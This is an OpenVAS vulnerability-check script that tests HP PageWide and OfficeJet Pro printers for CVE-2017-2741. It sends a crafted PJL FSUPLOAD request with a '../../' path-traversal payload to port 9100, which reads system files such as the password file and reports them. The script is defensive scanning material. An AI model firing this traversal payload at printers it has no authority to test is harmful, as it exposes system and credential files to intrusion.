##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_printer_rce_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# HP Printers Arbitrary Code Execution Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106920");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-07-05 09:03:32 +0700 (Wed, 05 Jul 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-2741");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("HP Printers Arbitrary Code Execution Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("pjl_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/hp-pjl", 9100);
  script_require_keys("Host/runs_unixoide");
  # nb: Don't add an script_mandatory_keys from e.g. pjl_detect.nasl
  # as some HP printers doesn't answer to the PJL probe request.

  script_tag(name:"summary", value:"A potential security vulnerability has been identified with certain HP
  printers. This vulnerability could potentially be exploited to execute arbitrary code.");

  script_tag(name:"vuldetect", value:"Sends a crafted PJL request and checks the response.");

  script_tag(name:"affected", value:"HP PageWide Printers and HP OfficeJet Pro Printers.");

  script_tag(name:"solution", value:"HP has provided firmware updates for impacted printers. See the
  referenced advisory for further details.");

  script_xref(name:"URL", value:"https://support.hp.com/lt-en/document/c05462914");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

port = get_kb_item("Services/hp-pjl");
if (!port) {
  port = 9100;
  not_in_kb = TRUE;
}

if (!get_port_state(port))
  exit(0);

files = traversal_files("linux");

# PJL ports get the Hex banner set to "aeaeaeaeae" in register_all_pjl_ports()
if (hexstr(get_unknown_banner(port: port, dontfetch: TRUE)) == "aeaeaeaeae" || not_in_kb) {
  soc = open_sock_tcp(port);
  if (!soc)
    exit(0);

  foreach pattern(keys(files)) {

    file = files[pattern];

    send(socket: soc, data: '\x1b%-12345X@PJL FSUPLOAD NAME="../../' + file + '" OFFSET=0 SIZE=648\r\n\x1b%-12345X\r\n');
    res = recv(socket: soc, length: 1024);
    close(soc);

    if (egrep(string: res, pattern: pattern)) {
      report = "It was possible to obtain the /" + file + " file.\n\n" + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);